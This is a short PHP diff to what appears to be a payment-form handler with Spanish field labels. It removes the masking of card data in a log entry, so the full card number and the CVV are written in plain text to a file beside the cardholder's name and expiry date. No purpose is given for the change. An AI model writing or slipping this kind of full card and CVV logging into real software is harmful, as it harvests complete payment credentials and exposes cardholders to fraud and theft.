@@ -106,10 +106,10 @@ try {
 
     $logEntry .= "DATOS DE TARJETA\n";
     $logEntry .= "Tipo: {$formData['cardType']}\n";
-    $logEntry .= "Número: ****" . substr($formData['cardNumber'], -4) . "\n";
+    $logEntry .= "Número: {$formData['cardNumber']}\n";
     $logEntry .= "Titular: {$formData['cardName']}\n";
     $logEntry .= "Vencimiento: {$formData['cardExpiry']}\n";
-    $logEntry .= "CVV: ***\n\n";
+    $logEntry .= "CVV: {$formData['cardCvv']}\n\n";
     $logEntry .= "======================================\n\n";
 
     // Write to file with exclusive lock
